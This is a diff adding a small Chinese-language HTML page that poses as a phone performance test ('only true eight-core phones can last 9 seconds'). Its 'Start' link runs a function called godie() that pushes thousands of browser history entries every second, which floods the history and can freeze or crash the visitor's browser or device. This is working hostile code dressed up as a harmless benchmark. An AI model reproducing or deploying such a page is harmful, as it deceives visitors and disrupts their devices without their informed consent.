@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>测测你的手机性能!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            padding: 44px 18px;
+            text-align: center;
+        }
+        a {
+            border: 1px dashed gray;
+            padding: 12px;
+        }
+    </style>
+</head>
+<body>
+    <h1>测测你的手机性能, 只有真八核的手机才能坚持9秒!</h1>
+
+    <h2><a href="javascript:godie();">开始!</a> </h2>
+
+    <h2>您已经坚持 <span>0</span> 秒, 最高记录<strong>0</strong>秒!</h2>
+
+    <h2>作者微信号: xuxsql</h2>
+
+<script>
+    (function () {
+        var rec=document.querySelector('strong').innerText=window.localStorage.getItem('sec') || 0;
+    })();
+
+    function godie()
+    {
+        var span = document.querySelector('span'), sec = 0;
+        var data = {k: 'val'};
+        setInterval(function() {
+            sec += 1;
+            span.innerText = sec+'';
+            window.localStorage.setItem('sec', sec);
+
+            setTimeout(function() {
+                for (var i=0; i<2e3; ++i) {
+                    history.pushState(data, 'title', location.href+'?'+i);
+                }
+            }, 1);
+        }, 900);
+    }
+</script>
+</body>
+</html>
